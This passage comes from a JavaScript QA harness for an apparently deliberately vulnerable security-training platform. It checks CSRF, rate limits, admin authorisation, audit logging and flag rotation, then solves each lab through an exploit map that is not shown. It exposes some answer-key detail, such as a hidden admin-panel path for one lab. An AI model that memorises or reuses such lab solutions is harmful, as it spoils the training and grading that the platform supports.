      indegree.set(dependent, indegree.get(dependent) - 1);
      if (indegree.get(dependent) === 0) ready.push(dependent);
    }
    ready.sort((a, b) => bySlug.get(a).index - bySlug.get(b).index);
  }
  assert(order.length === definitions.length, 'prerequisite graph contains a cycle');
  return order;
}

function flagWord(slug) {
  return String(slug).replace(/[^a-zA-Z0-9]+/g, '_').replace(/^_|_$/g, '').toLowerCase();
}

async function challengeBySlug(slug) {
  const challenge = await Challenge.findOne({ slug }).lean();
  assert(challenge, `catalog is missing ${slug}`);
  return challenge;
}

async function userByUsername(username) {
  const user = await User.findOne({ username }).lean();
  assert(user, `database is missing user ${username}`);
  return user;
}

async function mongoUri() {
  const client = mongoose.connection.client;
  const uri = client?.s?.url || client?.url || process.env.MONGODB_URI;
  assert(uri, 'could not determine the in-memory MongoDB URI');
  return uri;
}

async function adminAction(client, route, fields = {}) {
  return client.postForm(route, fields, { accept: 'text/html' });
}

async function main() {
  console.log(`ZeroDay Academy QA run ${RUN_ID}`);
  console.log(`Node ${process.version}, ${definitions.length} catalog definitions`);
  assert(definitions.length === 56, `expected 56 lab definitions, found ${definitions.length}`);
  assert(new Set(definitions.map(lab => lab.slug)).size === 56, 'catalog contains duplicate slugs');
  assert(topoOrder().length === 56, 'catalog prerequisite graph is invalid');

  const app = await createApp({ seed: true, log: false });
  await new Promise((resolve, reject) => {
    server = app.listen(0, '127.0.0.1', resolve);
    server.once('error', reject);
  });
  baseUrl = `http://127.0.0.1:${server.address().port}`;
  console.log(`Application listening on ${baseUrl}`);

  const founder = new Client(baseUrl, 'founder');
  const admin = founder;
  const mainClient = new Client(baseUrl, 'main');
  const second = new Client(baseUrl, 'second');
  const rotate = new Client(baseUrl, 'rotate');
  const probe = new Client(baseUrl, 'probe');
  const anonymous = new Client(baseUrl, 'anonymous');
  const duplicateClient = new Client(baseUrl, 'duplicate');
  const shortClient = new Client(baseUrl, 'short');
  const limiter = new Client(baseUrl, 'limiter');

  const mainUsername = `qa_main_${RUN_ID}`;
  const secondUsername = `qa_second_${RUN_ID}`;
  const rotateUsername = `qa_rotate_${RUN_ID}`;
  const probeUsername = `qa_probe_${RUN_ID}`;
  const mainEmail = `${mainUsername}@qa.zeroday.test`;

  try {
    await check('application health endpoint', async () => {
      const { response, data } = await anonymous.getJson('/healthz');
      assert(response.status === 200, `healthz returned ${response.status}`);
      assert(data && data.ok === true, 'healthz did not report ok');
      assert(data.labs === 56, `healthz reported ${data.labs} labs`);
    });

    await check('security headers on platform pages', async () => {
      const { response } = await anonymous.text('/');
      assert(response.headers.get('x-content-type-options') === 'nosniff', 'missing X-Content-Type-Options');
      assert(response.headers.get('x-frame-options') === 'DENY', 'platform page missing X-Frame-Options');
      assert(String(response.headers.get('content-security-policy') || '').includes("frame-ancestors 'none'"), 'platform page missing CSP frame-ancestors');
    });

    await check('catalog metadata and static flag hygiene', async () => {
      for (const lab of definitions) {
        assert(lab.title && lab.briefing && lab.summary, `${lab.slug}: incomplete catalog text`);
        assert(Array.isArray(lab.objectives) && lab.objectives.length > 0, `${lab.slug}: no objectives`);
        assert(Array.isArray(lab.hints) && lab.hints.length > 0, `${lab.slug}: no hints`);
        assert(lab.solution && lab.solution.length > 20, `${lab.slug}: no solution writeup`);
        assert(lab.owaspRef && lab.asvsRef && lab.wstgRef && lab.cwe && lab.attackTechnique, `${lab.slug}: incomplete threat mapping`);
        assert(lab.labPath === `/labs/${lab.slug}`, `${lab.slug}: wrong lab path`);
        assert(fs.existsSync(path.join(ROOT, 'views', 'labs', `${lab.slug}.ejs`)), `${lab.slug}: missing view`);
        assert(fs.existsSync(path.join(ROOT, 'labs', `${lab.slug}.js`)), `${lab.slug}: missing router`);
        assert(lab.published === true && lab.archived === false, `${lab.slug}: unexpected publication state`);
        assert(!lab.prerequisites.includes(lab.slug), `${lab.slug}: self prerequisite`);
      }
      const literal = /ZDS\{[0-9a-f]{24}\}/i;
      for (const directory of ['labs', 'views/labs']) {
        for (const file of fs.readdirSync(path.join(ROOT, directory))) {
          if (!file.endsWith('.js') && !file.endsWith('.ejs')) continue;
          const source = fs.readFileSync(path.join(ROOT, directory, file), 'utf8');
          assert(!literal.test(source), `${directory}/${file}: contains a literal flag-shaped secret`);
        }
      }
      assert(!literal.test(JSON.stringify(definitions)), 'catalog definitions contain a literal flag-shaped secret');
      return `${definitions.length} labs have complete views, routers, mappings and writeups`;
    });

    await check('CSRF rejects a state-changing request without a token', async () => {
      const response = await anonymous.request('/register', {
        method: 'POST',
        form: { username: `csrf_${RUN_ID}`, email: `csrf_${RUN_ID}@qa.test`, password: QA_PASSWORD, confirmPassword: QA_PASSWORD }
      });
      assert(response.status === 403, `missing-token registration returned ${response.status}`);
    });

    await check('registration, session regeneration, duplicate and password validation', async () => {
      const before = await mainClient.text('/register');
      assert(before.response.status === 200, 'registration page did not render');
      const originalSid = mainClient.cookies.find(cookie => cookie.name === config.session.name)?.value;
      const response = await register(mainClient, mainUsername, mainEmail, QA_PASSWORD);
      assert(response.status === 302, `registration returned ${response.status}`);
      assert(response.headers.get('location') === '/dashboard', 'registration did not redirect to the dashboard');
      const regeneratedSid = mainClient.cookies.find(cookie => cookie.name === config.session.name)?.value;
      assert(originalSid && regeneratedSid && originalSid !== regeneratedSid, 'registration did not regenerate the session identifier');

      const dashboard = await mainClient.text('/dashboard');
      assert(dashboard.response.status === 200, 'dashboard did not load after registration');
      assert(dashboard.text.includes(mainUsername), 'dashboard did not render the authenticated username');

      const duplicate = await register(duplicateClient, mainUsername, `duplicate_${RUN_ID}@qa.test`, QA_PASSWORD);
      assert(duplicate.status === 400, `duplicate registration returned ${duplicate.status}`);
      const shortPassword = await register(shortClient, `qa_short_${RUN_ID}`, `qa_short_${RUN_ID}@qa.test`, 'short');
      assert(shortPassword.status === 400, `short-password registration returned ${shortPassword.status}`);
      return 'session rotated, duplicate rejected, weak password rejected';
    });

    await check('registration rate limit', async () => {
      const secondResponse = await register(second, secondUsername, `${secondUsername}@qa.test`, QA_PASSWORD);
      assert(secondResponse.status === 302, `second registration returned ${secondResponse.status}`);
      const rotateResponse = await register(rotate, rotateUsername, `${rotateUsername}@qa.test`, QA_PASSWORD);
      assert(rotateResponse.status === 302, `rotate registration returned ${rotateResponse.status}`);
      const probeResponse = await register(probe, probeUsername, `${probeUsername}@qa.test`, QA_PASSWORD);
      assert(probeResponse.status === 302, `probe registration returned ${probeResponse.status}`);
      const seventh = await register(duplicateClient, `qa_extra_${RUN_ID}`, `qa_extra_${RUN_ID}@qa.test`, QA_PASSWORD);
      assert(seventh.status === 429, `seventh registration returned ${seventh.status} instead of 429`);
      return 'six requests accepted/rejected by validation; seventh rate-limited';
    });

    await check('login rate limit', async () => {
      await limiter.ensureCsrf('/login');
      for (let attempt = 1; attempt <= 10; attempt += 1) {
        const response = await limiter.request('/login', {
          method: 'POST',
          form: { _csrf: limiter.csrfToken, username: `ghost_${RUN_ID}`, password: 'not-a-real-password' },
          headers: { Accept: 'text/html' }
        });
        assert(response.status === 401, `login attempt ${attempt} returned ${response.status}`);
      }
      const limited = await limiter.request('/login', {
        method: 'POST',
        form: { _csrf: limiter.csrfToken, username: `ghost_${RUN_ID}`, password: 'not-a-real-password' },
        headers: { Accept: 'text/html' }
      });
      assert(limited.status === 429, `eleventh login attempt returned ${limited.status}`);
      return '10 failed logins allowed then 429';
    });

    await check('logout and login session regeneration', async () => {
      const sessionBefore = mainClient.cookies.find(cookie => cookie.name === config.session.name)?.value;
      const logout = await mainClient.logout();
      assert(logout.status === 302, `logout returned ${logout.status}`);
      const afterLogout = await mainClient.text('/dashboard');
      assert(afterLogout.response.status === 302, 'dashboard remained available after logout');
      assert(afterLogout.response.headers.get('location')?.startsWith('/login'), 'dashboard did not redirect to login after logout');

      const loginResponse = await login(mainClient, mainUsername, QA_PASSWORD);
      assert(loginResponse.status === 302, `login returned ${loginResponse.status}`);
      const sessionAfter = mainClient.cookies.find(cookie => cookie.name === config.session.name)?.value;
      assert(sessionBefore && sessionAfter && sessionBefore !== sessionAfter, 'login did not issue a new session identifier');
      const dashboard = await mainClient.text('/dashboard');
      assert(dashboard.response.status === 200, 'dashboard did not load after login');
      return 'logout invalidated the session; login rotated it';
    });

    await check('founder startup bootstrap and admin authorization', async () => {
      const founderDoc = await userByUsername('founder');
      assert(founderDoc.email === 'founder.zeroday@gmail.com', 'founder email is wrong');
      assert(founderDoc.role === 'admin', 'founder is not an administrator');
      assert(founderDoc.status === 'active', 'founder is not active');
      const loginResponse = await login(founder, 'founder', FOUNDER_PASSWORD);
      assert(loginResponse.status === 302, `founder login returned ${loginResponse.status}`);
      const dashboard = await admin.text('/admin');
      assert(dashboard.response.status === 200, `admin dashboard returned ${dashboard.response.status}`);
      assert(dashboard.text.includes('Platform overview'), 'admin dashboard did not render');
      const bootstrapAudit = await AuditLog.countDocuments({ action: 'admin.bootstrap_created' });
      assert(bootstrapAudit === 1, `expected one bootstrap-created audit, found ${bootstrapAudit}`);
      return 'founder exists, is admin, and can open the admin panel';
    });

    await check('non-admin cannot access admin routes', async () => {
      const response = await mainClient.text('/admin');
      assert(response.response.status === 403, `non-admin admin request returned ${response.response.status}`);
    });

    const probeDoc = await userByUsername(probeUsername);
    const secondDoc = await userByUsername(secondUsername);
    const founderDoc = await userByUsername('founder');

    await check('admin mutation requires CSRF', async () => {
      const response = await admin.request(`/admin/users/${probeDoc._id}/role`, {
        method: 'POST',
        form: { role: 'admin' }
      });
      assert(response.status === 403, `CSRF-less admin mutation returned ${response.status}`);
    });

    await check('founder self-demotion and self-suspension are blocked', async () => {
      const demote = await adminAction(admin, `/admin/users/${founderDoc._id}/role`, { role: 'user' });
      assert(demote.status === 400, `founder self-demotion returned ${demote.status}`);
      const suspend = await adminAction(admin, `/admin/users/${founderDoc._id}/status`, { status: 'suspended' });
      assert(suspend.status === 400, `founder self-suspension returned ${suspend.status}`);
      const current = await userByUsername('founder');
      assert(current.role === 'admin' && current.status === 'active', 'blocked founder mutation still changed the account');
    });

    await check('role changes and final-administrator protection', async () => {
      const promote = await adminAction(admin, `/admin/users/${probeDoc._id}/role`, { role: 'admin' });
      assert(promote.status === 302, `promoting probe admin returned ${promote.status}`);
      assert((await userByUsername(probeUsername)).role === 'admin', 'probe was not promoted');
      const probeAdmin = await probe.text('/admin');
      assert(probeAdmin.response.status === 200, 'promoted probe cannot access admin routes');
      const selfDemote = await adminAction(probe, `/admin/users/${probeDoc._id}/role`, { role: 'user' });
      assert(selfDemote.status === 400, `probe self-demotion returned ${selfDemote.status}`);
      const demoteFounder = await adminAction(probe, `/admin/users/${founderDoc._id}/role`, { role: 'user' });
      assert(demoteFounder.status === 302, `probe could not demote the founder while two admins existed (${demoteFounder.status})`);
      assert((await userByUsername('founder')).role === 'user', 'founder demotion did not persist');
      const lastAdminSelfDemote = await adminAction(probe, `/admin/users/${probeDoc._id}/role`, { role: 'user' });
      assert(lastAdminSelfDemote.status === 400, `last-admin self-demotion returned ${lastAdminSelfDemote.status}`);
      const adminCount = await User.countDocuments({ role: 'admin', status: 'active' });
      assert(adminCount === 1, `expected one active admin, found ${adminCount}`);
      const restore = await adminAction(probe, `/admin/users/${founderDoc._id}/role`, { role: 'admin' });
      assert(restore.status === 302, `probe could not restore founder admin (${restore.status})`);
      const demoteProbe = await adminAction(admin, `/admin/users/${probeDoc._id}/role`, { role: 'user' });
      assert(demoteProbe.status === 302, `founder could not demote probe (${demoteProbe.status})`);
      assert((await userByUsername(probeUsername)).role === 'user', 'probe demotion did not persist');
      const roleAudits = await AuditLog.countDocuments({ action: 'admin.user_role' });
      assert(roleAudits >= 4, `expected role-change audit events, found ${roleAudits}`);
      return `${roleAudits} role changes audited; last-admin guard held`;
    });

    await check('account suspension, reactivation and user detail', async () => {
      const suspend = await adminAction(admin, `/admin/users/${secondDoc._id}/status`, { status: 'suspended' });
      assert(suspend.status === 302, `suspending second user returned ${suspend.status}`);
      assert((await userByUsername(secondUsername)).status === 'suspended', 'suspend state did not persist');
      const blockedDashboard = await second.text('/dashboard');
      assert(blockedDashboard.response.status === 302, 'suspended user could still open dashboard');
      const blockedLogin = await login(second, secondUsername, QA_PASSWORD);
      assert(blockedLogin.status === 403, `suspended login returned ${blockedLogin.status}`);
      const reactivate = await adminAction(admin, `/admin/users/${secondDoc._id}/status`, { status: 'active' });
      assert(reactivate.status === 302, `reactivating second user returned ${reactivate.status}`);
      const restoredLogin = await login(second, secondUsername, QA_PASSWORD);
      assert(restoredLogin.status === 302, `reactivated login returned ${restoredLogin.status}`);
      const detail = await admin.text(`/admin/users/${secondDoc._id}`);
      assert(detail.response.status === 200, 'admin user detail did not render');
      assert(detail.text.includes(secondUsername), 'admin user detail omitted the username');
      const filtered = await admin.text(`/admin/users?q=${encodeURIComponent(secondUsername)}`);
      assert(filtered.response.status === 200 && filtered.text.includes(secondUsername), 'admin user search did not find the user');
      return 'suspension blocks access, reactivation restores it, detail/search render';
    });

    await check('flag submission validation, rate limits and isolation', async () => {
      const mainStart = await mainClient.startLab('api-excessive-data');
      assert(mainStart.status === 302, `main api-excessive-data start returned ${mainStart.status}`);

      const blank = await mainClient.submitFlag('api-excessive-data', '   ');
      assert(blank.response.status === 400 && blank.data && blank.data.ok === false, `blank flag returned ${blank.response.status}`);

      const wrong = await mainClient.submitFlag('api-excessive-data', 'ZDS{definitely_wrong}');
      assert(wrong.response.status === 200 && wrong.data && wrong.data.ok === false, `wrong flag returned ${wrong.response.status}`);

      const noInstance = await mainClient.submitFlag('xxe-oob-exfil', 'ZDS{not_started}');
      assert(noInstance.response.status === 409, `submission without an instance returned ${noInstance.response.status}`);

      const secondStart = await second.startLab('api-excessive-data');
      assert(secondStart.status === 302, `second api-excessive-data start returned ${secondStart.status}`);
      for (let attempt = 1; attempt <= 10; attempt += 1) {
        const response = await second.submitFlag('api-excessive-data', `ZDS{wrong_${attempt}}`);
        if (attempt < 10) {
          assert(response.response.status === 200 && response.data && response.data.ok === false, `failure ${attempt} returned ${response.response.status}`);
        } else {
          assert(response.response.status === 429, `tenth failure returned ${response.response.status}`);
          assert(/too many failed submissions/i.test(response.data?.message || ''), 'tenth failure did not report the failure threshold');
        }
      }

      const rotateStart = await rotate.startLab('api-excessive-data');
      assert(rotateStart.status === 302, `rotate api-excessive-data start returned ${rotateStart.status}`);
      for (let attempt = 0; attempt < 20; attempt += 1) {
        const response = await rotate.submitFlag('api-excessive-data', `ZDS{cap_${attempt}}`);
        assert([200, 429].includes(response.response.status), `cap attempt ${attempt} returned ${response.response.status}`);
      }
      const capped = await rotate.submitFlag('api-excessive-data', 'ZDS{cap_final}');
      assert(capped.response.status === 429, `submission cap returned ${capped.response.status}`);
      assert(/too many submissions/i.test(capped.data?.message || ''), 'submission cap did not report the per-challenge limit');

      const rotateOther = await rotate.startLab('forced-browse-admin');
      assert(rotateOther.status === 302, `rotate forced-browse start returned ${rotateOther.status}`);
      const independent = await rotate.submitFlag('forced-browse-admin', 'ZDS{independent_wrong}');
      assert(independent.response.status === 200 && independent.data && independent.data.ok === false, `per-challenge isolation returned ${independent.response.status}`);

      const shared = 'ZDS{qa_shared_hash_probe}';
      const sharedFirst = await mainClient.submitFlag('api-excessive-data', shared);
      assert(sharedFirst.response.status === 200 && sharedFirst.data.ok === false, `shared hash first submission returned ${sharedFirst.response.status}`);
      const sharedSecond = await second.submitFlag('api-excessive-data', shared);
      assert(sharedSecond.response.status === 429, `shared hash second submission returned ${sharedSecond.response.status}`);
      return 'blank/wrong/409, failure threshold, 20-per-5-minute cap, per-challenge isolation and shared-hash replay exercised';
    });

    await check('admin submission telemetry exposes burst and shared-hash signals', async () => {
      const { response, text } = await admin.text('/admin/submissions');
      assert(response.status === 200, `admin submissions returned ${response.status}`);
      assert(/failures in 10 minutes/.test(text), 'admin submissions did not flag the failure burst');
      assert(text.includes('Flag hash shared across accounts'), 'admin submissions did not flag the shared flag hash');
      const total = await FlagSubmission.countDocuments();
      assert(text.includes(`${total} recorded attempts`), `admin submissions did not report all ${total} attempts`);
      return 'failure-burst and shared-hash indicators rendered from real submissions';
    });

    await check('admin audit trail matches graded submissions', async () => {
      const total = await FlagSubmission.countDocuments();
      const { response, text } = await admin.text('/admin/audit?action=flag.submission');
      assert(response.status === 200, `admin audit returned ${response.status}`);
      const match = text.match(/(\d+) immutable events/);
      assert(match, 'admin audit page did not report an event count');
      assert(Number(match[1]) === total, `audit reported ${match[1]} flag submissions, database has ${total}`);
      const limited = await admin.text('/admin/audit?action=flag.rate_limited');
      const limitedMatch = limited.text.match(/(\d+) immutable events/);
      assert(limitedMatch && Number(limitedMatch[1]) >= 1, 'rate-limited audit events were not recorded');
      return `${total} graded submissions each produced one immutable audit event`;
    });

    await check('admin lab metadata editing and catalog reseed', async () => {
      const challenge = await challengeBySlug('graphql-introspection');
      const original = {
        title: challenge.title,
        points: challenge.points,
        level: challenge.level,
        estimatedMinutes: challenge.estimatedMinutes,
        flagVersion: challenge.flagVersion
      };
      const update = await adminAction(admin, `/admin/labs/${challenge._id}/update`, {
        title: `${original.title} QA`,
        points: String(original.points + 25),
        level: String(original.level),
        estimatedMinutes: '17'
      });
      assert(update.status === 302, `lab metadata update returned ${update.status}`);
      const changed = await challengeBySlug('graphql-introspection');
      assert(changed.title === `${original.title} QA`, 'lab title update did not persist');
      assert(changed.points === original.points + 25, 'lab points update did not persist');
      assert(changed.estimatedMinutes === 17, 'lab estimated minutes update did not persist');

      const invalid = await adminAction(admin, `/admin/labs/${challenge._id}/update`, { title: '', points: '10', level: '9' });
      assert(invalid.status === 400, `invalid lab metadata returned ${invalid.status}`);

      const reseed = await adminAction(admin, '/admin/labs/reseed');
      assert(reseed.status === 302, `catalog reseed returned ${reseed.status}`);
      const restored = await challengeBySlug('graphql-introspection');
      assert(restored.title === original.title && restored.points === original.points && restored.level === original.level, 'reseed did not restore catalog metadata');
      assert(restored.flagVersion === original.flagVersion, 'reseed unexpectedly changed the flag version');
      return 'metadata edited, invalid input rejected, reseed restored canonical values';
    });

    await check('lab visibility and archive are enforced for non-admins', async () => {
      const challenge = await challengeBySlug('graphql-introspection');
      await adminAction(admin, `/admin/labs/${challenge._id}/visibility`);
      let current = await challengeBySlug('graphql-introspection');
      assert(current.published === false, 'unpublish did not take effect');
      const hiddenDetail = await mainClient.text('/challenges/graphql-introspection');
      assert(hiddenDetail.response.status === 404, `hidden lab detail returned ${hiddenDetail.response.status}`);
      const hiddenLab = await mainClient.text('/labs/graphql-introspection');
      assert(hiddenLab.response.status === 404, `hidden lab root returned ${hiddenLab.response.status}`);

      await adminAction(admin, `/admin/labs/${challenge._id}/visibility`);
      current = await challengeBySlug('graphql-introspection');
      assert(current.published === true, 'republish did not take effect');
      const visible = await mainClient.text('/challenges/graphql-introspection');
      assert(visible.response.status === 200, `republished lab detail returned ${visible.response.status}`);

      await adminAction(admin, `/admin/labs/${challenge._id}/archive`);
      current = await challengeBySlug('graphql-introspection');
      assert(current.archived === true && current.published === false, 'archive did not hide the lab');
      const archivedLab = await mainClient.text('/labs/graphql-introspection');
      assert(archivedLab.response.status === 404, `archived lab root returned ${archivedLab.response.status}`);

      await adminAction(admin, `/admin/labs/${challenge._id}/archive`);
      current = await challengeBySlug('graphql-introspection');
      assert(current.archived === false, 'unarchive did not take effect');
      if (!current.published) await adminAction(admin, `/admin/labs/${challenge._id}/visibility`);
      current = await challengeBySlug('graphql-introspection');
      assert(current.published === true && current.archived === false, 'lab was not restored to the catalog');
      return 'hidden and archived labs return 404 to users; restoration works';
    });

    await check('archiving a lab stops every active instance', async () => {
      const challenge = await challengeBySlug('api-excessive-data');
      const mainDoc = await userByUsername(mainUsername);
      await mainClient.text('/labs/api-excessive-data');
      const instance = await LabInstance.findOne({ userId: mainDoc._id, challengeId: challenge._id, status: 'active' }).lean();
      assert(instance, 'api-excessive-data has no active instance to archive');
      const archive = await adminAction(admin, `/admin/labs/${challenge._id}/archive`);
      assert(archive.status === 302, `archiving api-excessive-data returned ${archive.status}`);
      const stopped = await LabInstance.findById(instance._id).lean();
      assert(stopped.status === 'stopped', 'archiving did not stop the active instance');
      const hidden = await mainClient.text('/labs/api-excessive-data');
      assert(hidden.response.status === 404, `archived lab returned ${hidden.response.status}`);
      await adminAction(admin, `/admin/labs/${challenge._id}/archive`);
      const restored = await challengeBySlug('api-excessive-data');
      if (!restored.published) await adminAction(admin, `/admin/labs/${challenge._id}/visibility`);
      const published = await challengeBySlug('api-excessive-data');
      assert(published.published === true && published.archived === false, 'api-excessive-data was not restored');
      return 'archive stopped the live instance and blocked access';
    });

    await check('admin can register a mounted lab missing from the catalog', async () => {
      const challenge = await challengeBySlug('xxe-oob-exfil');
      await LabInstance.deleteMany({ challengeId: challenge._id });
      await Challenge.deleteOne({ _id: challenge._id });
      const page = await admin.text('/admin/labs');
      assert(page.response.status === 200, `admin labs returned ${page.response.status}`);
      assert(page.text.includes('Mounted lab modules missing'), 'admin labs did not report the unregistered module');
      assert(page.text.includes('xxe-oob-exfil'), 'admin labs did not name the unregistered module');

      const register = await adminAction(admin, '/admin/labs/register-missing');
      assert(register.status === 302, `register-missing returned ${register.status}`);
      const restored = await challengeBySlug('xxe-oob-exfil');
      assert(restored.published === true && restored.archived === false, 're-registered lab is not published');
      return 'mounted router missing from the catalog was detected and re-registered';
    });

    await check('admin flag rotation invalidates issued flags and stops instances', async () => {
      const challenge = await challengeBySlug('forced-browse-admin');
      const versionBefore = Number(challenge.flagVersion || 1);
      const start = await mainClient.startLab('forced-browse-admin');
      assert(start.status === 302, `forced-browse start returned ${start.status}`);
      const mainDoc = await userByUsername(mainUsername);
      const instance = await LabInstance.findOne({ userId: mainDoc._id, challengeId: challenge._id, status: 'active' }).lean();
      assert(instance, 'forced-browse has no active instance');
      const panel = await mainClient.text('/labs/forced-browse-admin/panel-x29a');
      const oldFlag = flagFrom(panel.text);
      assert(oldFlag, 'could not recover the pre-rotation flag');

      const rotate = await adminAction(admin, `/admin/labs/${challenge._id}/rotate-flag`);
      assert(rotate.status === 302, `flag rotation returned ${rotate.status}`);
      const rotated = await challengeBySlug('forced-browse-admin');
      assert(rotated.flagVersion === versionBefore + 1, `flag version did not increment (${rotated.flagVersion})`);
      const stopped = await LabInstance.findById(instance._id).lean();
      assert(stopped.status === 'stopped', 'flag rotation did not stop the old instance');

      const restart = await mainClient.startLab('forced-browse-admin');
      assert(restart.status === 302, `post-rotation start returned ${restart.status}`);
      const oldSubmit = await mainClient.submitFlag('forced-browse-admin', oldFlag);
      assert(oldSubmit.response.status === 200 && oldSubmit.data && oldSubmit.data.ok === false, 'pre-rotation flag was still accepted');
      const newPanel = await mainClient.text('/labs/forced-browse-admin/panel-x29a');
      const newFlag = flagFrom(newPanel.text);
      assert(newFlag && newFlag !== oldFlag, 'flag rotation did not derive a new value');
      const stop = await mainClient.postForm('/challenges/forced-browse-admin/stop', {}, { accept: 'text/html' });
      assert(stop.status === 302, `post-rotation stop returned ${stop.status}`);
      return 'old flag rejected, new value derived and old instance stopped';
    });

    await check('admin pages render live data', async () => {
      const pages = [
        ['/admin', 'Platform overview'],
        ['/admin/users', 'User management'],
        [`/admin/users/${secondDoc._id}`, 'Recent submissions'],
        ['/admin/labs', 'Lab management'],
        ['/admin/submissions', 'Flag submissions'],
        ['/admin/audit', 'Audit log'],
        ['/admin/analytics', 'Analytics'],
        ['/admin/health', 'System health']
      ];
      for (const [route, marker] of pages) {
        const { response, text } = await admin.text(route);
        assert(response.status === 200, `${route} returned ${response.status}`);
        assert(text.includes(marker), `${route} did not render ${marker}`);
      }
      const health = await anonymous.getJson('/healthz');
      assert(health.data.labs === 56, 'healthz lost mounted labs');
      return `${pages.length} admin pages rendered real data`;
    });

    await check('lab access requires authentication and prerequisites', async () => {
      const anonymousLab = await anonymous.request('/labs/sqli-login');
      assert(anonymousLab.status === 302, `anonymous lab access returned ${anonymousLab.status}`);
      assert(String(anonymousLab.headers.get('location') || '').startsWith('/login?next='), 'anonymous lab access did not redirect to login');

      const anonymousPost = await anonymous.request('/labs/sqli-login/login', {
        method: 'POST',
        form: { username: 'admin', password: 'x' }
      });
      assert(anonymousPost.status === 401, `anonymous lab POST returned ${anonymousPost.status}`);

      const lockedStart = await mainClient.startLab('sqli-union');
      assert(lockedStart.status === 403, `locked lab start returned ${lockedStart.status}`);
      const lockedDirect = await mainClient.text('/labs/sqli-union');
      assert(lockedDirect.response.status === 403, `locked lab root returned ${lockedDirect.response.status}`);

      const adminDirect = await admin.text('/labs/sqli-union');
      assert(adminDirect.response.status === 200, 'administrator was not exempt from prerequisites');
      return 'anonymous users redirected, users blocked by prerequisites, admins exempt';
    });

    await check('unknown labs and routes return 404', async () => {
      const detail = await mainClient.text('/challenges/not-a-real-lab');
      assert(detail.response.status === 404, `unknown challenge returned ${detail.response.status}`);
      const lab = await mainClient.text('/labs/not-a-real-lab');
      assert(lab.response.status === 404, `unknown lab returned ${lab.response.status}`);
      const start = await mainClient.startLab('not-a-real-lab');
      assert(start.status === 404, `unknown lab start returned ${start.status}`);
      const submit = await mainClient.submitFlag('not-a-real-lab', 'ZDS{nope}');
      assert(submit.response.status === 404, `unknown lab submit returned ${submit.response.status}`);
      const route = await anonymous.text('/not-a-real-route');
      assert(route.response.status === 404, `unknown route returned ${route.response.status}`);
      return 'unknown challenge, lab, start, submit and generic routes return 404';
    });

    await check('hint endpoint reveals catalog hints one at a time', async () => {
      const lab = definitions.find(definition => definition.slug === 'sqli-login');
      for (let index = 0; index < lab.hints.length; index += 1) {
        const response = await mainClient.postJson('/challenges/sqli-login/hint', {});
        const data = await response.json();
        assert(response.status === 200 && data && data.ok === true, `hint ${index + 1} returned ${response.status}`);
        assert(data.hint === lab.hints[index], `hint ${index + 1} did not match the catalog`);
        assert(data.revealed === index + 1 && data.total === lab.hints.length, `hint ${index + 1} progress was wrong`);
      }
      const extraResponse = await mainClient.postJson('/challenges/sqli-login/hint', {});
      const extra = await extraResponse.json();
      assert(extra.revealed === lab.hints.length, 'exhausted hints did not stay capped');
      assert(extra.hint === lab.hints[lab.hints.length - 1], 'exhausted hints did not repeat the final hint');
      return `${lab.hints.length} hints revealed in order and capped`;
    });

    await check('lab explorer filters and ordered catalog API', async () => {
      const all = await mainClient.text('/challenges');
      assert(all.response.status === 200, `explorer returned ${all.response.status}`);
      assert(all.text.includes('Authentication Bypass via SQL Injection'), 'explorer did not list the first lab');

      const levelOne = await mainClient.text('/challenges?level=1');
      assert(levelOne.text.includes('Authentication Bypass via SQL Injection'), 'level filter removed level 1 labs');
      assert(!levelOne.text.includes('GraphQL Introspection'), 'level filter included a non-level-1 lab');

      const graphql = definitions.find(definition => definition.slug === 'graphql-introspection');
      const search = await mainClient.text(`/challenges?q=${encodeURIComponent('GraphQL')}`);
      assert(search.text.includes(graphql.title), 'search filter did not find the GraphQL lab');

      const domain = await mainClient.text(`/challenges?domain=${encodeURIComponent('SQL Injection')}`);
      assert(domain.text.includes('Authentication Bypass via SQL Injection'), 'domain filter did not find SQL injection labs');

      const locked = await mainClient.text('/challenges?status=locked');
      assert(locked.text.includes('badge-locked') || locked.text.includes('Locked'), 'locked filter returned no locked labs');

      const order = await mainClient.getJson('/api/challenge-order');
      assert(order.response.status === 200 && Array.isArray(order.data) && order.data.length === 56, 'challenge-order did not return 56 labs');
      assert(order.data.every(item => item.labPath === `/labs/${item.slug}`), 'challenge-order returned an invalid lab path');
      return 'search, level, domain, status and order API verified';
    });

    const labOrder = topoOrder();
    console.log(`\nExploiting ${labOrder.length} labs in prerequisite order...`);
    for (const slug of labOrder) {
      const result = { slug, ok: false, detail: '' };
      try {
        const start = await mainClient.startLab(slug);
        assert(start.status === 302, `start returned ${start.status}`);
        const page = await mainClient.text(`/labs/${slug}`);
        assert(page.response.status === 200, `lab root returned ${page.response.status}`);
        assert(!flagFrom(page.text), 'flag was exposed before exploitation');

        const exploit = exploits[slug];
        assert(typeof exploit === 'function', 'no exploit implementation');
        const flag = await exploit(mainClient, slug);
        assert(flag, 'exploit did not recover a flag');
        assert(/^ZDS\{[^}\r\n]{1,180}\}$/.test(flag), `invalid flag shape: ${flag}`);
        const prefix = `ZDS{${flagWord(slug)}_default_`;
        assert(flag.startsWith(prefix), `flag prefix did not match ${prefix}`);

        const submitted = await mainClient.submitFlag(slug, flag);
        assert(submitted.response.status === 200, `submit returned ${submitted.response.status}`);
        assert(submitted.data && submitted.data.ok === true, `submit rejected the recovered flag: ${submitted.text.slice(0, 160)}`);
        assert(submitted.data.alreadySolved === false, 'lab was already solved before traversal');
        assert(Number(submitted.data.points) > 0, 'solve did not award points');

        const reset = await mainClient.request(`/labs/${slug}/reset`, { method: 'POST' });
        assert(reset.status === 302, `lab reset returned ${reset.status}`);
        const stop = await mainClient.postForm(`/challenges/${slug}/stop`, {}, { accept: 'text/html' });
        assert(stop.status === 302, `platform stop returned ${stop.status}`);

        result.ok = true;
        console.log(`PASS lab ${slug}`);
      } catch (error) {
        result.detail = error.message;
        console.log(`FAIL lab ${slug} - ${error.message}`);
        try {
          await mainClient.postForm(`/challenges/${slug}/stop`, {}, { accept: 'text/html' });
        } catch {
          // Best-effort cleanup only.
        }
      }
      results.labs.push(result);
    }
    const labPassed = results.labs.filter(item => item.ok).length;
    record('topological lab traversal', labPassed === labOrder.length, `${labPassed}/${labOrder.length} labs exploited, submitted and reset`);

    await check('all solved progress is reflected across the platform', async () => {
      const mainDoc = await userByUsername(mainUsername);
      const expectedPoints = definitions.reduce((total, lab) => total + lab.points, 0);
      assert(mainDoc.points === expectedPoints, `user has ${mainDoc.points} points, expected ${expectedPoints}`);
      const solves = await Solve.find({ userId: mainDoc._id }).lean();
      assert(solves.length === 56, `expected 56 solves, found ${solves.length}`);
